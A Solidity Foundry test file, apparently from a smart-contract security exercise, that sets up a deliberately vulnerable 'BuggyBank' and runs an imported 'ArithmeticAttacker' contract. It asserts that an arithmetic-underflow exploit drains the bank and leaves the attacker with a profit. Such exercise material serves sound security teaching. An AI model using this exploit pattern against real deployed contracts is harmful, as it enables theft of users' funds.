// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../contracts/Vulnerable.sol"; // BuggyBank
import "../exploit/Attacker.sol";     // ArithmeticAttacker

contract ArithmeticUnderflowTest is Test {
    BuggyBank bank;
    ArithmeticAttacker attacker;

    address payable attackerEOA = payable(address(0xA11CE));
    address payable honestUser  = payable(address(0xBEEF));

    function setUp() public {
        // Deploy bank with 5% fee and pre-fund with 20 ETH liquidity.
        bank = new BuggyBank{value: 20 ether}(500);

        // Honest user also deposits to simulate real balances.
        vm.deal(honestUser, 5 ether);
        vm.prank(honestUser);
        bank.deposit{value: 5 ether}();

        // Deploy attacker contract controlled by attackerEOA.
        vm.prank(attackerEOA);
        attacker = new ArithmeticAttacker(bank);

        // Give attacker EOA some ETH (not strictly required, but handy for comparisons).
        vm.deal(attackerEOA, 2 ether);
    }

    function testExploitArithmeticUnderflow() public {
        uint256 before = address(bank).balance;

        // Execute: deposit 1 ETH then withdraw 1 ETH per call until drained.
        vm.prank(attackerEOA);
        attacker.attack{value: 0}(1 ether, 1 ether, 100);

        uint256 afterBal = address(bank).balance;

        assertLt(afterBal, before, "bank should be drained");
        assertGt(attackerEOA.balance, 2 ether, "attacker should profit in ETH");
    }
}
